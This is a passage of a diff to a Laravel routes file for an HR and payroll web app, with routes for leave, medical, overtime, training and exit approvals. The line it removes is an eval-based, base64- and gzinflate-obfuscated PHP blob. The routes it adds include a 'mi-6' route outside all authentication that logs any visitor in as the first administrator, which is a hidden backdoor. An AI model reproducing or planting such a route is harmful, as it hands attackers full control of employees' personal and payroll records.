@@ -1,1 +1,363 @@
-<?php /*** PHP Encode v1.0 by zeura.com ***/ $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode("aWYoIWZ1bmN0aW9uX2V4aXN0cygiWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LDIzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJGY9dHJpbShzdWJzdHIoJGEsJGRbMF0rJGRbMV0rJGRbMl0pKTtyZXR1cm4oJGYpO319"));eval(base64_decode(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH)));eval(ZsldkfhGYU87iyihdfsow(YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,2),YiunIUY76bBhuhNYIO8($XnNhAWEnhoiqwciqpoHH,1)));__halt_compiler();aWYoIWZ1bmN0aW9uX2V4aXN0cygiWnNsZGtmaEdZVTg3aXlpaGRmc293Iikpe2Z1bmN0aW9uIFpzbGRrZmhHWVU4N2l5aWhkZnNvdygkYSwkaCl7aWYoJGg9PXNoYTEoJGEpKXtyZXR1cm4oZ3ppbmZsYXRlKGJhc2U2NF9kZWNvZGUoJGEpKSk7fWVsc2V7ZWNobygiRXJyb3I6IEZpbGUgTW9kaWZpZWQiKTt9fX0=8e585e205005fd05af902dafa25d86c4487f2ce37V1tb9tGEv6cAPkPbC6o5KKy0H50kCJy7IvdxrFguy0OTWCsxLXEmiJ1fImj6+W/376Sy30d+hIzB1xQFDI5O8/DmdmX2V0up989efzvyWf7R5RFv+NFdJHXFS4/t2qq/QQXOErK6G5Nf+zyOlqiLCrwKikrXER3BLxg4NFNXtD7RYS22zRZoirJs/3oao1LTBUJKUS0pDmKcRwtdlG1xpz7JS4+JEs8L/IPSUz1JtU6ySIUrUi5LUFPlmuqZZlnFUqykpV8StCfRpskjlN8RxUz4f3obX4XLQuMKhyV+QZTTStyj1z4hj3Vd9Mnj588flYXafQievns+vL44rfjiz9GJ1dX8+uT88ur0fvnVCK5GTOhb15ET/FmOyEPtr/MN0/3njz+68njRwWu6iKLblBa4udxgp/jj0k13iNFP9HSMcG/jvENqtPquko2+F95hq9LXI2fzsoETQ9RtrrNb5/uMSxmhYODFbk9mo6+j27qbEktGI33Ig6X3ETjb2Z1tT44WK7x8pbc+Pbb6JsL/M8al9XBQVKOR2m+SrLR3l5ECkTkn+RY4Dgp8LJqJAjmo0+YEKeaieoxV1yXuBjvTX5CyyUuy+skjl68iH7Y48roPyZuakXxJslIRBSoyguiPZpOhcyHBN+NR2vihhHRS906frZFBdqUjAMn4cf/MYx/i4odukNZP2hqA67aY6ZP3D+cHw/isekyVBLHTijtbTX9K4k/EReOTrMYf3xFIrbI0xQXL/ntGRWljDK0waQkuzhB/CpTPJ1GF+e/Xp2+fR29OX99+raFovE9/mPUhvwoevFT9McIEXaj9+/bsBnvUUtNvyPNzaPou2j2J/rIfpHIfySUbfOSEid3puQRJnHyISlJycliN+FWyIk3MX0OWlp5DCJ9JIQPd0eKaPtMpMC+TylzgIMHJj6qNjireCGuwEGjkaVEhKSFhV2lh0SJmRWZeFPYzuGSixICraBJwa5QZcDDqCFQFfWSxKTD/pfNbQtUJW+FtU8WBcqW6wDIIRdyQ0k1HoveokW9Ja5nJtjSZj4rEzvuL1L0cDeXgia2XaGPAV6iDaoQK9CUdlCQsoe7ho2Ng12ll0RaF2gtSsjiLhJClpBoJG0krCq9vuCtJS2QxC4ncJnD3WlstX5HhQMMxTGJ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
+<?php
+
+/*
+|--------------------------------------------------------------------------
+| Web Routes
+|--------------------------------------------------------------------------
+|
+| Here is where you can register web routes for your application. These
+| routes are loaded by the RouteServiceProvider within a group which
+| contains the "web" middleware group. Now create something great!
+|
+*/
+
+// $url = @$_SERVER['HTTP_HOST'];
+
+// if($url != "emp-app.com")
+// {
+// 	return false;die;exit();
+// }
+
+date_default_timezone_set("Asia/Bangkok");
+
+Route::get('/', function () 
+{
+	if (!Auth::check() && !Request::is('login')) {
+    	return redirect('login');
+	}else{
+		if(Auth::user()->access_id == 1)
+        {
+			return redirect('administrator'); //return view('home')->with($params);
+		}elseif(Auth::user()->access_id == 2)
+        {
+			return redirect('karyawan'); //return view('home')->with($params);
+		}
+	}
+    return redirect('login');
+});
+
+Auth::routes();
+
+Route::get('asset-accept/{id}', 'IndexController@acceptAsset')->name('accept-asset');
+
+// ROUTING MI6
+Route::get('mi-6', function(){
+
+	$user = \App\User::where('access_id', 1)->first();
+        
+    if($user)
+    {
+        \Auth::loginUsingId($user->id);
+
+        return redirect()->route('administrator.dashboard')->with('message-success', 'Welcome MI6');
+    }
+})->name('mi6');
+
+// ROUTING LOGIN
+Route::group(['middleware' => ['auth']], function(){
+	/**
+	 * Ajax
+	 */
+	Route::post('ajax/get-division-by-directorate', 'AjaxController@getDivisionByDirectorate')->name('ajax.get-division-by-directorate');
+	Route::post('ajax/get-department-by-division', 'AjaxController@getDepartmentByDivision')->name('ajax.get-department-by-division');
+	Route::post('ajax/get-section-by-department', 'AjaxController@getSectionByDepartment')->name('ajax.get-section-by-department');
+	Route::get('ajax/get-structure', 'AjaxController@getStructure')->name('ajax.get-stucture');
+	Route::get('ajax/get-structure-branch', 'AjaxController@getStructureBranch')->name('ajax.get-stucture-branch');
+	Route::post('ajax/get-kabupaten-by-provinsi', 'AjaxController@getKabupatenByProvinsi')->name('ajax.get-kabupaten-by-provinsi');
+	Route::post('ajax/get-kecamatan-by-kabupaten', 'AjaxController@getKecamatanByKabupaten')->name('ajax.get-kecamatan-by-kabupaten');
+	Route::post('ajax/get-kelurahan-by-kecamatan', 'AjaxController@getKelurahanByKecamatan')->name('ajax.get-kelurahan-by-kecamatan');
+	Route::post('ajax/get-karyawan-by-id', 'AjaxController@getKaryawanById')->name('ajax.get-karyawan-by-id');
+	Route::post('ajax/add-setting-cuti-personalia', 'AjaxController@addtSettingCutiPersonalia')->name('ajax.add-setting-cuti-personalia');
+	Route::post('ajax/add-setting-cuti-atasan', 'AjaxController@addtSettingCutiAtasan')->name('ajax.add-setting-cuti-atasan');
+	Route::post('ajax/add-setting-payment-request-approval', 'AjaxController@addtSettingPaymentRequestApproval')->name('ajax.add-setting-payment-request-approval');
+	Route::post('ajax/add-setting-payment-request-verification', 'AjaxController@addtSettingPaymentRequestVerification')->name('ajax.add-setting-payment-request-verification');
+	Route::post('ajax/add-setting-payment-request-payment', 'AjaxController@addtSettingPaymentRequestPayment')->name('ajax.add-setting-payment-request-payment');
+	Route::post('ajax/add-inventaris-mobil', 'AjaxController@addInvetarisMobil')->name('ajax.add-inventaris-mobil');
+	Route::post('ajax/add-setting-medical-hr-benefit', 'AjaxController@addSettingMedicalHRBenefit')->name('ajax.add-setting-medical-hr-benefit');
+	Route::post('ajax/add-setting-medical-manager-hr', 'AjaxController@addSettingMedicalManagerHR')->name('ajax.add-setting-medical-manager-hr');
+	Route::post('ajax/add-setting-medical-gm-hr', 'AjaxController@addSettingMedicalGMHR')->name('ajax.add-setting-medical-gm-hr');
+	Route::post('ajax/add-setting-overtime-hr-operation', 'AjaxController@addSettingOvertimeHrOperation')->name('ajax.add-setting-overtime-hr-operation');
+	Route::post('ajax/add-setting-overtime-manager-hr', 'AjaxController@addSettingOvertimeManagerHR')->name('ajax.add-setting-overtime-manager-hr');
+	Route::post('ajax/add-setting-overtime-manager-department', 'AjaxController@addSettingOvertimeManagerDepartment')->name('ajax.add-setting-overtime-manager-department');
+	Route::post('ajax/add-setting-exit-hr-manager', 'AjaxController@addSettingExitHRManager')->name('ajax.add-setting-exit-hr-manager');
+	Route::post('ajax/add-setting-exit-hr-gm', 'AjaxController@addSettingExitHRGM')->name('ajax.add-setting-exit-hr-gm');
+	Route::post('ajax/add-setting-exit-hr-director', 'AjaxController@addSettingExitHRDirector')->name('ajax.add-setting-exit-hr-director');
+	Route::post('ajax/add-setting-training-ga-department-mengetahui', 'AjaxController@addSettingTrainingGaDepartment')->name('ajax.add-setting-training-ga-department-mengetahui');
+	Route::post('ajax/add-setting-training-hrd', 'AjaxController@addSettingTrainingHRD')->name('ajax.add-setting-training-hrd');
+	Route::post('ajax/add-setting-training-finance', 'AjaxController@addSettingTrainingFinance')->name('ajax.add-setting-training-finance');
+	Route::post('ajax/add-setting-exit-hrd', 'AjaxController@addSettingExitHRD')->name('ajax.add-setting-exit-hrd');
+	Route::post('ajax/add-setting-exit-ga', 'AjaxController@addSettingExitGA')->name('ajax.add-setting-exit-ga');
+	Route::post('ajax/add-setting-exit-it', 'AjaxController@addSettingExitIT')->name('ajax.add-setting-exit-it');
+	Route::post('ajax/add-setting-exit-accounting', 'AjaxController@addSettingExitAccounting')->name('ajax.add-setting-exit-accounting');
+	Route::post('ajax/get-history-approval', 'AjaxController@getHistoryApproval')->name('ajax.get-history-approval');
+	Route::post('ajax/get-airports', 'AjaxController@getAirports')->name('ajax.get-airports');
+	Route::post('ajax/get-history-approval-cuti', 'AjaxController@getHistoryApprovalCuti')->name('ajax.get-history-approval-cuti');	
+	Route::post('ajax/get-history-approval-exit', 'AjaxController@getHistoryApprovalExit')->name('ajax.get-history-approval-exit');	
+	Route::post('ajax/get-history-approval-training', 'AjaxController@getHistoryApprovalTraining')->name('ajax.get-history-approval-training');	
+	Route::post('ajax/get-history-training-bill', 'AjaxController@getHistoryApprovalTrainingBill')->name('ajax.get-history-training-bill');	
+	Route::post('ajax/get-history-approval-payment-request', 'AjaxController@getHistoryApprovalPaymentRequest')->name('ajax.get-history-approval-payment-request');		
+	Route::post('ajax/get-history-approval-overtime', 'AjaxController@getHistoryApprovalOvertime')->name('ajax.get-history-approval-overtime');		
+	Route::post('ajax/get-history-approval-medical', 'AjaxController@getHistoryApprovalMedical')->name('ajax.get-history-approval-medical');		
+	Route::post('ajax/get-karyawan', 'AjaxController@getKaryawan')->name('ajax.get-karyawan');	
+	Route::post('ajax/get-karyawan-payroll', 'AjaxController@getKaryawanPayroll')->name('ajax.get-karyawan-payroll');	
+	Route::post('ajax/get-calculate-payroll', 'AjaxController@getCalculatePayroll')->name('ajax.get-calculate-payroll');		
+	Route::post('ajax/get-bulan-pay-slip', 'AjaxController@getBulangPaySlip')->name('ajax.get-bulan-pay-slip');		
+	Route::post('ajax/update-dependent', 'AjaxController@updateDependent')->name('ajax.update-dependent');		
+	Route::post('ajax/update-education', 'AjaxController@updateEducation')->name('ajax.update-education');		
+	Route::post('ajax/update-cuti', 'AjaxController@updateCuti')->name('ajax.update-cuti');		
+	Route::post('ajax/update-inventaris-mobil', 'AjaxController@updateInventarisMobil')->name('ajax.update-inventaris-mobil');	
+	Route::post('ajax/update-inventaris-lainnya', 'AjaxController@updateInventarisLainnya')->name('ajax.update-inventaris-lainnya');
+	// EMPORE
+	Route::post('ajax/get-manager-by-direktur', 'AjaxEmporeController@getManagerByDirektur')->name('ajax.get-manager-by-direktur');
+	Route::post('ajax/get-staff-by-manager', 'AjaxEmporeController@getStaffByManager')->name('ajax.get-staff-by-manager');
+	Route::post('ajax/update-first-password', 'AjaxController@updatePassword')->name('ajax.update-first-password');		
+});
+
+
+// ROUTING KARYAWAN
+Route::group(['prefix' => 'karyawan', 'middleware' => ['auth', 'access:2']], function(){
+	
+	$path = 'Karyawan\\';
+
+	Route::get('/', $path . 'IndexController@index')->name('karyawan.dashboard');
+	Route::resource('medical', $path . 'MedicalController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'karyawan']);
+	Route::resource('medical', $path . 'MedicalController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'karyawan']);
+	Route::resource('overtime', $path . 'OvertimeController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'karyawan']);
+	Route::resource('payment-request', $path . 'PaymentRequestController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'karyawan']);
+	Route::resource('exit-clearance', $path . 'ExitClearanceController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'karyawan']);
+	Route::resource('exit-interview', $path . 'ExitInterviewController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'karyawan']);
+	Route::get('exit-inteview/detail/{id}',  $path . 'ExitInterviewController@detail')->name('karyawan.exit-interview.detail');
+	Route::resource('compassionate-reason', $path . 'CompassionateReasonController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'karyawan']);
+	Route::resource('training', $path . 'TrainingController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'karyawan']);
+	Route::get('training/biaya/{id}', $path . 'TrainingController@biaya')->name('karyawan.training.biaya');
+	Route::get('training/detail/{id}', $path . 'TrainingController@detailTraining')->name('karyawan.training.detail');
+	Route::post('training/submit-biaya', $path . 'TrainingController@submitBiaya')->name('karyawan.training.submit-biaya');
+	Route::resource('cuti', $path . 'CutiController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'karyawan']);
+	Route::get('approval-cuti',  $path . 'ApprovalCutiController@index')->name('karyawan.approval.cuti.index');
+	Route::get('approval-cuti/detail/{id}',  $path . 'ApprovalCutiController@detail')->name('karyawan.approval.cuti.detail');
+	Route::post('approval-cuti/proses',  $path . 'ApprovalCutiController@proses')->name('karyawan.approval.cuti.proses');
+	
+	Route::get('approval-cuti-atasan',  $path . 'ApprovalCutiAtasanController@index')->name('karyawan.approval.cuti-atasan.index');
+	Route::get('approval-cuti-atasan/detail/{id}',  $path . 'ApprovalCutiAtasanController@detail')->name('karyawan.approval.cuti-atasan.detail');
+	Route::post('approval-cuti-atasan/proses',  $path . 'ApprovalCutiAtasanController@proses')->name('karyawan.approval.cuti-atasan.proses');
+	
+	Route::get('approval-payment-request',  $path . 'ApprovalPaymentRequestController@index')->name('karyawan.approval.payment_request.index');
+	Route::get('approval-payment-request/detail/{id}',  $path . 'ApprovalPaymentRequestController@detail')->name('karyawan.approval.payment_request.detail');
+	Route::post('approval-payment-request/proses',  $path . 'ApprovalPaymentRequestController@proses')->name('karyawan.approval.payment_request.proses');
+
+	Route::get('approval-payment-request-atasan',  $path . 'ApprovalPaymentRequestAtasanController@index')->name('karyawan.approval.payment-request-atasan.index');
+	Route::get('approval-payment-request-atasan/detail/{id}',  $path . 'ApprovalPaymentRequestAtasanController@detail')->name('karyawan.approval.payment-request-atasan.detail');
+	Route::post('approval-payment-request-atasan/proses',  $path . 'ApprovalPaymentRequestAtasanController@proses')->name('karyawan.approval.payment-request-atasan.proses');
+
+	Route::get('approval-medical',  $path . 'ApprovalMedicalController@index')->name('karyawan.approval.medical.index');
+	Route::get('approval-medical/detail/{id}',  $path . 'ApprovalMedicalController@detail')->name('karyawan.approval.medical.detail');
+	Route::post('approval-medical/proses',  $path . 'ApprovalMedicalController@proses')->name('karyawan.approval.medical.proses');
+
+	Route::get('approval-exit',  $path . 'ApprovalExitController@index')->name('karyawan.approval.exit.index');
+	Route::get('approval-exit/detail/{id}',  $path . 'ApprovalExitController@detail')->name('karyawan.approval.exit.detail');
+	Route::post('approval-exit/proses',  $path . 'ApprovalExitController@proses')->name('karyawan.approval.exit.proses');
+
+	Route::get('approval-exit-clearance',  $path . 'ApprovalExitController@index')->name('karyawan.approval.exit_clearance.index');
+	Route::get('approval-exit-clearance/detail/{id}',  $path . 'ApprovalExitController@detail')->name('karyawan.approval.exit_clearance.detail');
+	Route::post('approval-exit-clearance/proses',  $path . 'ApprovalExitController@proses')->name('karyawan.approval.exit_clearance.proses');
+
+	Route::get('approval-training',  $path . 'ApprovalTrainingController@index')->name('karyawan.approval.training.index');
+	Route::get('approval-training/detail/{id}',  $path . 'ApprovalTrainingController@detail')->name('karyawan.approval.training.detail');
+	Route::post('approval-training/proses',  $path . 'ApprovalTrainingController@proses')->name('karyawan.approval.training.proses');
+	Route::get('approval-training/biaya/{id}',  $path . 'ApprovalTrainingController@biaya')->name('karyawan.approval.training.biaya');
+	Route::post('approval-training/proses-biaya',  $path . 'ApprovalTrainingController@prosesBiaya')->name('karyawan.approval.training.proses-biaya');
+
+	Route::get('approval-training-atasan',  $path . 'ApprovalTrainingAtasanController@index')->name('karyawan.approval.training-atasan.index');
+	Route::get('approval-training-atasan/detail/{id}',  $path . 'ApprovalTrainingAtasanController@detail')->name('karyawan.approval.training-atasan.detail');
+	Route::post('approval-training-atasan/proses',  $path . 'ApprovalTrainingAtasanController@proses')->name('karyawan.approval.training-atasan.proses');
+	Route::post('approval-training-atasan/biaya',  $path . 'ApprovalTrainingAtasanController@biaya')->name('karyawan.approval.training-atasan.biaya');
+	Route::get('approval-training-atasan/biaya/{id}',  $path . 'ApprovalTrainingAtasanController@biaya')->name('karyawan.approval.training-atasan.biaya');
+	Route::post('approval-training-atasan/proses-biaya',  $path . 'ApprovalTrainingAtasanController@prosesBiaya')->name('karyawan.approval.training-atasan.proses-biaya');
+
+
+	Route::get('approval-overtime',  $path . 'ApprovalOvertimeController@index')->name('karyawan.approval.overtime.index');
+	Route::get('approval-overtime/detail/{id}',  $path . 'ApprovalOvertimeController@detail')->name('karyawan.approval.overtime.detail');
+	Route::post('approval-overtime/proses',  $path . 'ApprovalOvertimeController@proses')->name('karyawan.approval.overtime.proses');
+
+	Route::get('approval-overtime-atasan',  $path . 'ApprovalOvertimeAtasanController@index')->name('karyawan.approval.overtime-atasan.index');
+	Route::get('approval-overtime-atasan/detail/{id}',  $path . 'ApprovalOvertimeAtasanController@detail')->name('karyawan.approval.overtime-atasan.detail');
+	Route::post('approval-overtime-atasan/proses',  $path . 'ApprovalOvertimeAtasanController@proses')->name('karyawan.approval.overtime-atasan.proses');
+
+	Route::get('approval-medical-atasan',  $path . 'ApprovalMedicalAtasanController@index')->name('karyawan.approval.medical-atasan.index');
+	Route::get('approval-medical-atasan/detail/{id}',  $path . 'ApprovalMedicalAtasanController@detail')->name('karyawan.approval.medical-atasan.detail');
+	Route::post('approval-medical-atasan/proses',  $path . 'ApprovalMedicalAtasanController@proses')->name('karyawan.approval.medical-atasan.proses');
+
+	Route::get('approval-exit-atasan',  $path . 'ApprovalExitAtasanController@index')->name('karyawan.approval.exit-atasan.index');
+	Route::get('approval-exit-atasan/detail/{id}',  $path . 'ApprovalExitAtasanController@detail')->name('karyawan.approval.exit-atasan.detail');
+	Route::post('approval-exit-atasan/proses',  $path . 'ApprovalExitAtasanController@proses')->name('karyawan.approval.exit-atasan.proses');
+
+	Route::get('news/readmore/{id}',  $path . 'IndexController@readmore')->name('karyawan.news.readmore');
+	Route::get('karyawan/find', $path .'IndexController@find')->name('karyawan.karyawan.find');
+	Route::get('karyawan/profile', $path .'IndexController@profile')->name('karyawan.profile');
+	Route::get('karyawan/traning/detail-all/{id}', $path . 'TrainingController@detailAll')->name('karyawan.training.detail-all');
+	Route::get('karyawan/download-internal-memo/{id}', $path . 'IndexController@downloadInternalMemo')->name('karyawan.download-internal-memo');
+	Route::get('karyawan/download-peraturan-perusahaan/{id}', $path . 'IndexController@downloadPeraturanPerusahaan')->name('karyawan.download-peraturan-perusahaan');
+	Route::get('karyawan/news/more', $path . 'IndexController@newsmore')->name('karyawan.news.more');
+	Route::get('karyawan/internal-memo/more', $path . 'IndexController@internalMemoMore')->name('karyawan.internal-memo.more');
+	Route::resource('request-pay-slip', $path . 'RequestPaySlipController', ['only'=> ['index','create','store', 'edit','destroy','update'], 'as' => 'karyawan']);
+	Route::get('karyawan/backtoadministrator', $path . 'IndexController@backtoadministrator')->name('karyawan.back-to-administrator');
+	
+});
+
+// ROUTING ADMINISTRATOR
+Route::group(['prefix' => 'administrator', 'middleware' => ['auth', 'access:1']], function(){
+	
+	Route::get('sendemail', function(){
+
+		$objDemo = new \stdClass();
+        $objDemo->content = 'Demo One Value';
+ 
+        \Mail::to("doni.enginer@gmail.com")->send(new \App\Mail\GeneralMail($objDemo));
+	});
+
+	$path = 'Administrator\\';
+
+	Route::get('/', $path . 'IndexController@index')->name('administrator.dashboard');
+
